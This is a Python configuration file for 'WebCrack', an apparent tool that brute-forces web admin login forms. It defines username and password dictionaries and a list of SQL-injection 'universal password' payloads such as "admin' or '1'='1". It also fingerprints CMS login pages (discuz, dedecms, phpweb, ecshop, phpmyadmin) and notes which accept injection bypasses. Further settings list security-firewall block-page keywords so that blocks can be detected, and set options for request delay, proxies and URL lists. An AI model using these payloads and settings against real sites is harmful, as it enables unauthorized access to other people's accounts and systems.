import os

IGNORE_DOMAINS = [".gov"]
def txt2list(txt):
    ret = []
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)), txt)
    with open(path, "r", encoding="UTF-8") as f:
        for line in f.readlines():
            ret.append(line.strip())
    return ret


logConfig = {
    "log_filename": "logs.txt",  # 普通日志文件名称
    "output_filename": "output.txt",  # 本次运行成功结果汇总（覆盖写入）
    "success_filename": "success.txt",  # 成功日志文件名称
}

crackConfig = {
    "success_words": [],  # 明确的登录成功正文标记；空列表仅使用 CMS 标记
    "json_token_fields": ["token", "access_token"],  # 顶层非空字符串 Token
    "json_success_fields": {},  # JSON 成功规则，例如 {"authenticated": True}，全部匹配
    "stop_words": ["已被锁定", "密码错误次数过多", "尝试次数", "安全拦截"],
    "timeout": 10,  # 超时时间
    "delay": 0.03,  # 每次请求之后sleep的间隔
    "test_username": "admin",  # 测试用户名
    "test_password": "length_test",  # 测试密码
    "requests_proxies": {  # 请求代理
        # "http": "127.0.0.1:8080",
        # "https": "127.0.0.1:8080"
    },
    "fail_words": ['密码错误', '重试', '不正确', '密码有误', '不成功', '重新输入', '不存在', '登录失败', '登陆失败', '密码或安全问题错误', 'history.go',
                   'history.back',
                   '已被锁定', '安全拦截', '还可以尝试', '无效', '攻击行为', '创宇盾', 'http://zhuji.360.cn/guard/firewall/stopattack.html',
                   'D盾_拦截提示', '用户不存在',
                   '非法', '百度云加速', '安全威胁', '防火墙', '黑客', '不合法', 'Denied', '尝试次数',
                   'http://safe.webscan.360.cn/stopattack.html', "Illegal operation", "服务器安全狗防护验证页面"]  # 黑名单关键字
}
generatorConfig = {
    "dict_config": {
        "base_dict": {
            "username_list": ['admin'],  # 爆破用户名字典
            "password_list": txt2list("password_list.txt")  # 爆破密码字典

        },
        "domain_dict": {
            "enable": True,
            "suffix_list": [  # 动态生成域名字典后缀
                "",
                "123",
                "666",
                "888",
                "123456"
            ],

        },
        "sqlin_dict": {
            "enable": True,
            "payload_list": [  # 万能密码列表
                "admin' or 'a'='a",
                "'or'='or'",
                "admin' or '1'='1' or 1=1",
                "')or('a'='a",
                "'or 1=1 -- -"
            ],
        }
    },
    "headers_config": {
        "enable": True,
        "default_headers": {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'User-Agent': "WebCrack Test",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            "Referer": "http://www.baidu.com/",
            'Content-Type': 'application/x-www-form-urlencoded'}
    }
}
parserConfig = {
    "json_login_detection": True,
    "json_script_limit": 8,
    "script_dependency_depth": 1,
    "script_total_max_bytes": 8388608,
    "discover_login_links": True,
    "site_profiles": [],  # 精确 page_url 匹配；配置示例见 README
    "username_field_names": ["username", "user", "account", "mobile", "email", "loginname"],
    "password_field_names": ["password", "passwd", "pwd", "pass"],
    "json_script_max_bytes": 2097152,  # 单个脚本最多 2 MiB，仍受脚本数量上限约束
    "default_value": "0000",  # 当参数没有value时的默认填充值
    "username_keyword_list": [  # 用户名参数关键字列表
        "user",
        "name",
        "zhanghao",
        "yonghu",
        "email",
        "account",
        "mobile",
    ],
    "password_keyword_list": [  # 密码参数关键字列表
        "pass",
        "pw",
        "mima"
    ],

    "captcha_keyword_list": [  # 验证码关键字列表
        "验证码",
        "captcha",
        "验 证 码",
        "点击更换",
        "点击刷新",
        "看不清",
        "认证码",
        "安全问题"
    ],

    "login_keyword_list": [  # 检测登录页面关键字
        "用户名",
        "密码",
        "login",
        "denglu",
        "登录",
        "user",
        "pass",
        "yonghu",
        "mima",
        "admin",
    ],

}
cmsConfig = {
    "discuz": {
        "name": "discuz",  # cms名称
        "keywords": "admin_questionid",  # cms页面指纹关键字
        "captcha": 0,  # 是否存在验证码
        "sqlin_able": 0,  # 是否存在后台sql注入
        "success_flag": "admin.php?action=logout",  # 登录成功关键字
        "die_flag": "密码错误次数过多",  # 若填写此项，遇到其中的关键字就会退出爆破，用于dz等对爆破次数有限制的cms
        "alert": 0,  # 若为1则会打印下面note的内容
        "note": "discuz论坛测试"
    },
    "dedecms": {
        "name": "dedecms",
        "keywords": "newdedecms",
        "captcha": 0,
        "sqlin_able": 0,
        "success_flag": "",
        "die_flag": "",
        "alert": 0,
        "note": "dedecms测试"
    },
    "phpweb": {
        "name": "phpweb",
        "keywords": "width:100%;height:100%;background:#ffffff;padding:160px",
        "captcha": 0,
        "sqlin_able": 1,
        "success_flag": "admin.php?action=logout",
        "die_flag": "",
        "alert": 1,
        "note": "存在 phpweb 万能密码 : admin' or '1' ='1' or '1'='1"
    },
    "ecshop": {
        "name": "ecshop",
        "keywords": "validator.required('username', user_name_empty);",
        "captcha": 0,
        "sqlin_able": 0,
        "success_flag": "ECSCP[admin_pass]",
        "die_flag": "",
        "alert": 0,
        "note": "ecshop测试"
    },
    "phpmyadmin": {
        "name": "phpmyadmin",
        "keywords": "pma_username",
        "captcha": 0,
        "sqlin_able": 0,
        "success_flag": "db_structure.php",
        "die_flag": "",
        "alert": 0,
        "note": "phpmyadmin测试"
    }
}

# 命令行选项定义；默认参数留在已有配置中，命令行仅覆盖本次运行。
cliConfig = {
    "description": "WebCrack 表单检测工具",
    "arguments": [
        {"flags": ["-u", "--url"], "group": "target", "help": "单个页面 URL"},
        {"flags": ["-f", "--file"], "group": "target", "help": "URL 列表文件"},
        {"flags": ["-o", "--output"], "help": "成功结果文件（默认 output.txt，覆盖写入）"},
        {"flags": ["--timeout"], "type": float, "help": "请求超时秒数（大于 0）"},
        {"flags": ["--delay"], "type": float, "help": "请求间隔秒数（不小于 0）"},
        {"flags": ["--proxy"], "help": "HTTP/HTTPS 代理 URL"},
        {"flags": ["--no-random-headers"], "action": "store_true", "help": "使用默认请求头"},
    ],
}
